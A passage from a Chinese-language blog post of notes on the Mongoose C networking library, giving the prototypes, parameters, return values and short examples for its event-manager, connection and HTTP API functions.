<li>mgr : 需要初始化的<code>mg_mgr</code>结构体指针</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_mgr</span> <span class="title">mgr</span>;</span></span><br><span class="line">mg_mgr_init(&amp;mgr);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-mgr-poll"><a href="#mg-mgr-poll" class="headerlink" title="mg_mgr_poll"></a>mg_mgr_poll</h2><ul>
<li><p>简介：</p>
<ul>
<li>在所有连接中迭代，接受新的连接，发送和接收数据，关闭连接并调用事件处理程序的功能，以适用于各自事件。</li>
<li>执行一次池迭代(poll iteration)。对在<code>mgr-&gt;conns</code>列表中的每一个连接进行如下操作<ul>
<li>查看是否有传入数据。如果有，将数据读入到<code>c-&gt;recv</code>缓冲区，并发出一个<code>MG_EV_READ</code>事件</li>
<li>查看<code>c-&gt;send</code>缓冲区是否有数据。如果有，写入数据，并发送<code>MG_EV_WRITE</code>事件</li>
<li>如果一个连接处于监听状态，或已接收一个进入的连接状态，发送一个<code>MG_EV_ACCEPT</code>事件</li>
<li>发送<code>MG_EV_POLL</code>事件</li>
</ul>
</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_mgr_poll</span><span class="params">(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">int</span> ms)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>mgr :  使用的事件管理结构体</li>
<li>ms : 超时时间，单位为毫秒</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (running == <span class="literal">true</span>) mg_mgr_poll(&amp;mgr, <span class="number">1000</span> <span class="comment">/*1 second*/</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-mgr-free"><a href="#mg-mgr-free" class="headerlink" title="mg_mgr_free"></a>mg_mgr_free</h2><ul>
<li><p>简介：</p>
<ul>
<li>关闭所有连接，释放所有资源</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_mgr_free</span><span class="params">(<span class="keyword">struct</span> mg_mgr *mgr)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>mgr : 需要被清除的事件管理结构体</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_mgr</span> <span class="title">mgr</span>;</span></span><br><span class="line">mg_mgr_init(&amp;mgr);</span><br><span class="line"><span class="keyword">while</span> (running == <span class="literal">true</span>) mg_mgr_poll(&amp;mgr, <span class="number">1000</span>);   <span class="comment">// Event loop</span></span><br><span class="line">mg_mgr_free(&amp;mgr);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-listen"><a href="#mg-listen" class="headerlink" title="mg_listen"></a>mg_listen</h2><ul>
<li><p>简介：</p>
<ul>
<li>创建一个监听连接，并将这个连接追加到<code>mgr-&gt;conns</code>连接列表中</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_connection *<span class="title function_">mg_listen</span><span class="params">(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">const</span> <span class="type">char</span> *url, <span class="type">mg_event_handler_t</span> fn, <span class="type">void</span> *fn_data)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>mgr : 使用的事件管理结构体</li>
<li>url : URL。指定监听的本地IP地址和端口，例如：<code>tcp://127.0.0.1:1234</code>或<code>udp://0.0.0.0:9000</code></li>
<li>fn :  事件处理函数</li>
<li>fn_data : 一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回创建的连接 </li>
<li>失败，返回NULL</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_connection</span> *<span class="title">c</span> =</span> mg_listen(&amp;mgr, <span class="string">&quot;tcp://127.0.0.1:8080&quot;</span>, fn, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-connect"><a href="#mg-connect" class="headerlink" title="mg_connect"></a>mg_connect</h2><ul>
<li><p>简介：</p>
<ul>
<li>创建一个出站连接，并将这个连接追加到<code>mgr-&gt;conns</code>队列中</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_connection *<span class="title function_">mg_connect</span><span class="params">(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">const</span> <span class="type">char</span> *url, <span class="type">mg_event_handler_t</span> fn, <span class="type">void</span> *fn_data)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数</p>
<ul>
<li>mgr : 使用的事件管理结构体</li>
<li>url : URL，指定需要连接的远程IP地址和端口。例如：<code>http://a.com</code></li>
<li>fn : 一个事件处理函数</li>
<li>fn_data :  一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回创建的连接 </li>
<li>失败，返回NULL</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_connection</span> *<span class="title">c</span> =</span> mg_connect(&amp;mgr, <span class="string">&quot;http://example.org&quot;</span>, fn, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-send"><a href="#mg-send" class="headerlink" title="mg_send"></a>mg_send</h2><ul>
<li><p>简介：</p>
<ul>
<li>将大小为<code>size</code>的数据追加到<code>c-&gt;send</code>缓冲区。返回追加的字节数</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mg_send</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c : 一个连接指针</li>
<li>data : 一个指向需要增加到输出缓冲区的数据指针</li>
<li>size : 数据大小</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功， true</li>
<li>失败， false</li>
</ul>
</li>
<li><p>详解：</p>
<ul>
<li>这个函数不会将数据推送到网络。它仅仅是将数据追加到输出缓冲区。</li>
<li>只有当<code>mg_mgr_poll()</code>被调用时，才会将数据发送出去。</li>
<li>如果<code>mg_send()</code>被多次调用，则输出缓冲区会增长</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mg_send(c, <span class="string">&quot;hi&quot;</span>, <span class="number">2</span>);  <span class="comment">// Append string &quot;hi&quot; to the output buffer</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-printf"><a href="#mg-printf" class="headerlink" title="mg_printf"></a>mg_printf</h2><ul>
<li><p>简介：</p>
<ul>
<li>与<code>mg_send()</code>相同，但是使用<code>printf()</code>语义格式化数据。返回追加到输出缓冲区的字节数。有关支持格式规范列表，参见<code>mg_snprintf</code></li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mg_printf</span><span class="params">(<span class="keyword">struct</span> mg_connection *, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c : 一个连接指针</li>
<li>fmt : <code>printf()</code>语义中的格式字符串</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回追加到输出缓冲区的字节数</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mg_printf(c, <span class="string">&quot;Hello, %s!&quot;</span>, <span class="string">&quot;world&quot;</span>); <span class="comment">// Add &quot;Hello, world!&quot; to output buffer</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-wrapfd"><a href="#mg-wrapfd" class="headerlink" title="mg_wrapfd"></a>mg_wrapfd</h2><ul>
<li><p>简介：</p>
<ul>
<li>将给定的文件描述符<code>fd</code>包装到连接中，然后将该连接添加到事件管理器中。这个<code>fd</code>文件描述符必须支持<code>send(), recv(), select()</code>系统调用，而且是非阻塞的。Mongoose将把它当做TCP套接字使用。<code>c-&gt;rem</code>和<code>c-&gt;loc</code>地址将会变为空的</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_connection *<span class="title function_">mg_wrapfd</span><span class="params">(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">int</span> fd, <span class="type">mg_event_handler_t</span> fn, <span class="type">void</span> *fn_data)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>fd : 需要包装的文件描述符</li>
<li>mgr : 一个事件管理结构体</li>
<li>fn : 一个指向事件处理函数的指针</li>
<li>ud : 一个用户数据指针。它将被当做<code>fn_data</code>参数传递给<code>fn</code></li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回创建的连接</li>
<li>失败，返回NULL</li>
</ul>
</li>
</ul>
<h2 id="mg-mkpipe"><a href="#mg-mkpipe" class="headerlink" title="mg_mkpipe"></a>mg_mkpipe</h2><ul>
<li><p>简介：</p>
<ul>
<li>创建两个互相连接的套接字，用于线程间通信。其中一个套接字被包装到一个Mongoose连接，并被添加到事件管理结构体中。另一个套接字将会被返回，且它应该被传递给工作线程。当一个工作线程使用<code>send()</code>发送任何数据到这个套接字，都将唤醒<code>mgr</code>和<code>fn</code>事件处理函数接收一个<code>MG_EV_READ</code>事件。另外，<code>fn</code>向工作线程发送的任何数据，都被由工作线程使用<code>recv()</code>接收</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mg_mkpipe</span><span class="params">(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">mg_event_handler_t</span> fn, <span class="type">void</span> *fn_data, <span class="type">bool</span> udp)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>mgr : 一个事件管理结构体</li>
<li>fn : 一个指向事件处理函数的指针</li>
<li>fn_data : 一个指向用户数据的指针。它将会被当做<code>fn_data</code>参数传递给<code>fn</code></li>
<li>udp : 告知创建一个UDP，还是创建一个TCP socketpair</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回创建的套接字</li>
<li>失败，返回-1</li>
</ul>
</li>
<li><p>示例：</p>
<ul>
<li>参考examples&#x2F;multi-threaded</li>
</ul>
</li>
</ul>
<h2 id="mg-hello"><a href="#mg-hello" class="headerlink" title="mg_hello"></a>mg_hello</h2><ul>
<li><p>简介：</p>
<ul>
<li>便利功能，在给定的监听URL上启动一个简单的Web服务器。这个函数只有在接收到一个<code>/quit</code>请求才会返回。服务器处理以下URI<ul>
<li><code>/quit</code>  –  退出服务，且退出函数</li>
<li><code>/debug</code> –  设置调试级别，作为POST负载，<code>&#123;&quot;level&quot; : 3&#125;</code>是有效的</li>
<li>对其他所有的URI，都将返回一个<code>hi</code>作为响应</li>
</ul>
</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_hello</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url : 一个监听的URL，例如：<code>http://0.0.0.0:8000</code></li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_http/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_http/" class="post-title-link" itemprop="url">mongoose_http</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>mongoose 中http相关api笔记</li>
</ul>
<h2 id="struct-mg-http-header"><a href="#struct-mg-http-header" class="headerlink" title="struct mg_http_header"></a>struct mg_http_header</h2><ul>
<li><p>简介：</p>
<ul>
<li>结构代表HTTP标头，像<code>Content-Type: text/html</code>。<code>Content-Type</code> 是一个 Header name，<code>text/html/</code>是一个 Header value</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_http_header</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> <span class="title">name</span>;</span>   <span class="comment">// Header name</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> <span class="title">value</span>;</span>  <span class="comment">// Header value</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="struct-mg-http-message"><a href="#struct-mg-http-message" class="headerlink" title="struct mg_http_message"></a>struct mg_http_message</h2><ul>
<li><p>简介：</p>
<ul>
<li>结构代表HTTP消息。</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_http_message</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> <span class="title">method</span>, <span class="title">uri</span>, <span class="title">query</span>, <span class="title">proto</span>;</span>             <span class="comment">// Request/response line</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_http_header</span> <span class="title">headers</span>[<span class="title">MG_MAX_HTTP_HEADERS</span>];</span>  <span class="comment">// Headers</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> <span class="title">body</span>;</span>                                  <span class="comment">// Body</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> <span class="title">message</span>;</span>                               <span class="comment">// Request line + headers + body</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-listen"><a href="#mg-http-listen" class="headerlink" title="mg_http_listen"></a>mg_http_listen</h2><ul>
<li><p>简介：</p>
<ul>
<li>创建HTTP侦听器。</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_connection *<span class="title function_">mg_http_listen</span><span class="params">(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">const</span> <span class="type">char</span> *url, <span class="type">mg_event_handler_t</span> fn, <span class="type">void</span> *fn_data)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>mgr : 一个事件管理结构体</li>
<li>url : 一个URL，指定监听的本地IP地址和端口。例如：<code>http://0.0.0.0:8000</code></li>
<li>fn : 一个事件处理函数</li>
<li>fn_data : 一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回一个指向创建的连接指针</li>
<li>失败，返回NULL</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_connection</span> *<span class="title">c</span> =</span> mg_http_listen(&amp;mgr, <span class="string">&quot;0.0.0.0:8000&quot;</span>, fn, arg);</span><br><span class="line"><span class="keyword">if</span> (c == <span class="literal">NULL</span>) fatal_error(<span class="string">&quot;Cannot create listener&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-connect"><a href="#mg-http-connect" class="headerlink" title="mg_http_connect"></a>mg_http_connect</h2><ul>
<li><p>简介</p>
<ul>
<li>创建HTTP客户端连接。这个函数不能连接到对端，它仅仅分配需要的资源和启动连接进程。当对端真正连接好了，会向连接事件处理函数发送一个<code>MG_EV_CONNECT</code>事件</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_connection *<span class="title function_">mg_http_connect</span><span class="params">(<span class="keyword">struct</span> mg_mgr *, <span class="type">const</span> <span class="type">char</span> *url, <span class="type">mg_event_handler_t</span> fn, <span class="type">void</span> *fn_data)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>mgr : 一个事件管理结构体</li>
<li>url : 一个URL，指定监听的本地IP地址和端口。例如：<code>http://0.0.0.0:8000</code></li>
<li>fn : 一个事件处理函数</li>
<li>fn_data : 一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回一个指向创建的连接指针</li>
<li>失败，返回NULL</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_connection</span> *<span class="title">c</span> =</span> mg_http_connect(&amp;mgr, <span class="string">&quot;http://google.com&quot;</span>, fn, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (c == <span class="literal">NULL</span>) fatal_error(<span class="string">&quot;Cannot create connection&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-status"><a href="#mg-http-status" class="headerlink" title="mg_http_status"></a>mg_http_status</h2><ul>
<li><p>简介：</p>
<ul>
<li>获取HTTP响应的状态代码。</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mg_http_status</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> mg_http_message *hm)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>hm : 需要解析的HTTP响应</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回状态码，例如：200表示成功</li>
</ul>
</li>
</ul>
<hr>
<h2 id="mg-http-get-request-len"><a href="#mg-http-get-request-len" class="headerlink" title="mg_http_get_request_len"></a>mg_http_get_request_len</h2><ul>
<li><p>简介：</p>
<ul>
<li>获取请求的长度。请求的长度是直到HTTP头结束的字节数。它不包括HTTP请求体的长度</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mg_http_get_request_len</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">size_t</span> buf_len)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>buf : 指向存放请求数据的缓冲区的指针</li>
<li>buf_len : 缓冲区大小</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回请求的长度</li>
<li>0, 消息不完整</li>
<li>-1， 错误</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *buf = <span class="string">&quot;GET /test \n\nGET /foo\n\n&quot;</span>;</span><br><span class="line"><span class="type">int</span> req_len = mg_http_get_request_len(buf, <span class="built_in">strlen</span>(buf));  <span class="comment">// req_len == 12</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-parse"><a href="#mg-http-parse" class="headerlink" title="mg_http_parse"></a>mg_http_parse</h2><ul>
<li><p>简介：</p>
<ul>
<li>解析请求报文字符串，并存入到<code>mg_http_message</code>结构体中</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mg_http_parse</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s, <span class="type">size_t</span> len, <span class="keyword">struct</span> mg_http_message *hm)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>s : 一个请求字符串</li>
<li>len : 请求字符串的长度</li>
<li>hm : 存储解析请求报文结果的结构体指针</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回请求报文的长度</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_http_message</span> <span class="title">hm</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *buf = <span class="string">&quot;GET / HTTP/1.0\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (mg_http_parse(buf, <span class="built_in">strlen</span>(buf), &amp;hm) &gt; <span class="number">0</span>) &#123; <span class="comment">/* success */</span> &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-printf-chunk"><a href="#mg-http-printf-chunk" class="headerlink" title="mg_http_printf_chunk"></a>mg_http_printf_chunk</h2><ul>
<li><p>简介：</p>
<ul>
<li>使用<code>printf()</code>语义，写一个块编码的块数据。(Write a chunk of data in chunked encoding format, using printf() semantic)</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_http_printf_chunk</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c : 一个连接指针</li>
<li>fmt : 以<code>printf()</code>语义的字符串</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mg_http_printf_chunk(c, <span class="string">&quot;Hello, %s!&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-write-chunk"><a href="#mg-http-write-chunk" class="headerlink" title="mg_http_write_chunk"></a>mg_http_write_chunk</h2><ul>
<li><p>简介：</p>
<ul>
<li>写入一个块编码格式的块数据(Write a chunk of data in chunked encoding format.)</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_http_write_chunk</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">size_t</span> len)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c : 一个连接指针</li>
<li>buf : 需要写入的数据</li>
<li>len : 写入数据的长度</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mg_http_write_chunk(c, <span class="string">&quot;hi&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-delete-chunk"><a href="#mg-http-delete-chunk" class="headerlink" title="mg_http_delete_chunk"></a>mg_http_delete_chunk</h2><ul>
<li><p>简介：</p>
<ul>
<li>从输入缓冲区中删除指定的块(chunk)</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_http_delete_chunk</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="keyword">struct</span> mg_http_message *hm)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c : 连接指针</li>
<li>hm : 需要删除的块(chunk)</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_HTTP_CHUNK) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mg_http_message</span> *<span class="title">hm</span> =</span> (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    mg_http_delete_chunk(c, hm); <span class="comment">// Remove received chunk</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="struct-mg-http-serve-opts"><a href="#struct-mg-http-serve-opts" class="headerlink" title="struct mg_http_serve_opts"></a>struct mg_http_serve_opts</h2><ul>
<li><p>简介：</p>
<ul>
